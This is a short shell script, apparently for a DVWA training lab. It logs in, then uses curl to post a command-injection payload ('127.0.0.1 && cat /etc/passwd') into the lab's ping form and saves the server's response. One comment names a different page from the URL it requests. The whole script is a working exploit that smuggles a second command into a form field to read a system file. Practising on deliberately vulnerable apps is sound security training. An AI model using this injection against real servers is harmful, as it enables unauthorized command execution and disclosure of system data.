#Login with found details
source ../levelled_login.sh low
#Check out the "Command injeciton" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/brute/ > /dev/null
#Get the server to 'cat /etc/passwd'
curl -s -i -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=127.0.0.1+%26%26+cat+%2Fetc%2Fpasswd&Submit=Submit" > result
unset LEVEL
unset SESSIONID
